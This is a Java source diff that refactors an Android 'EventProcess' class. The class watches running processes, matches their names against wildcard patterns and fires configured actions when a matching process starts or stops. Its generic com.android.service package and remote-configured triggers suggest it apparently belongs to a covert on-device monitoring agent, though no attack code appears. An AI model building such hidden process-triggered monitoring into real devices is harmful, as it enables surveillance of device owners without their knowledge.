@@ -14,51 +14,45 @@ import java.io.IOException;
 import com.android.service.ProcessInfo;
 import com.android.service.ProcessStatus;
 import com.android.service.auto.Cfg;
+import com.android.service.conf.ConfEvent;
+import com.android.service.conf.ConfigurationException;
 import com.android.service.interfaces.Observer;
 import com.android.service.listener.ListenerProcess;
 import com.android.service.util.Check;
 import com.android.service.util.DataBuffer;
 import com.android.service.util.WChar;
 
-public class EventProcess extends EventBase implements Observer<ProcessInfo> {
+public class EventProcess extends BaseEvent implements Observer<ProcessInfo> {
 	/** The Constant TAG. */
 	private static final String TAG = "EventProcess"; //$NON-NLS-1$
 
 	private int actionOnEnter, actionOnExit;
-	private int type;
 	private boolean active = false;
 	private String starname;
+	private boolean window;
+	private boolean focus;
 
 	@Override
-	public void begin() {
+	public void actualStart() {
 		ListenerProcess.self().attach(this);
 	}
 
 	@Override
-	public void end() {
+	public void actualStop() {
 		ListenerProcess.self().detach(this);
+		
+		onExit(); // di sicurezza
 	}
 
 	@Override
-	public boolean parse(EventConf event) {
-		super.setEvent(event);
-
-		final byte[] conf = event.getParams();
-		final DataBuffer databuffer = new DataBuffer(conf, 0, conf.length);
-
+	public boolean parse(ConfEvent conf) {
 		try {
-			actionOnEnter = event.getAction();
-			actionOnExit = databuffer.readInt();
-			type = databuffer.readInt();
-
-			// Estraiamo il nome del processo
-			final byte[] procName = new byte[databuffer.readInt()];
-			databuffer.read(procName);
-
-			starname = WChar.getString(procName, true);
-		} catch (final IOException e) {
+			window = conf.getBoolean("window");
+			focus = conf.getBoolean("focus");
+			starname = conf.getString("process");
+		} catch (final ConfigurationException e) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Error: params FAILED") ;//$NON-NLS-1$
+				Check.log(TAG + " Error: params FAILED");//$NON-NLS-1$
 			}
 
 			return false;
@@ -68,7 +62,7 @@ public class EventProcess extends EventBase implements Observer<ProcessInfo> {
 	}
 
 	@Override
-	public void go() {
+	public void actualGo() {
 
 	}
 
@@ -88,13 +82,6 @@ public class EventProcess extends EventBase implements Observer<ProcessInfo> {
 			onExit();
 		}
 
-		switch (type) {
-			case 0: // Process
-			case 1: // Window
-			default:
-				break;
-		}
-
 		return 0;
 	}
 
@@ -111,31 +98,31 @@ public class EventProcess extends EventBase implements Observer<ProcessInfo> {
 
 			if (wildcardProcess.charAt(0) == '*') {
 				wildcardProcess = wildcardProcess.substring(1);
-				
+
 				if (wildcardProcess.length() == 0) {
 					return true;
 				}
 
 				if (wildcardProcess.charAt(0) != '?' && wildcardProcess.charAt(0) != '*') {
 					final int len = processName.length();
-					
+
 					for (int i = 0; i < len; i++) {
 						final char c = processName.charAt(0);
 						processName = processName.substring(1);
 						final String tp = wildcardProcess.substring(1);
-						
+
 						if (c == wildcardProcess.charAt(0) && matchStar(tp, processName)) {
 							return true;
 						}
 					}
-					
+
 					return false;
 				}
 
 				for (int i = 0; i < processName.length(); i++) {
 					final char c = processName.charAt(i);
 					processName = processName.substring(1);
-					
+
 					if (matchStar(wildcardProcess, processName)) {
 						return true;
 					}
@@ -156,21 +143,5 @@ public class EventProcess extends EventBase implements Observer<ProcessInfo> {
 		}
 
 		// NOTREACHED
-	}
-
-	public void onEnter() {
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (onEnter): triggering " + actionOnEnter + " " + starname) ;//$NON-NLS-1$ //$NON-NLS-2$
-		}
-		
-		trigger(actionOnEnter);
-	}
-
-	public void onExit() {
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (onExit): triggering " + actionOnExit + " " + starname) ;//$NON-NLS-1$ //$NON-NLS-2$
-		}
-		
-		trigger(actionOnExit);
 	}
 }
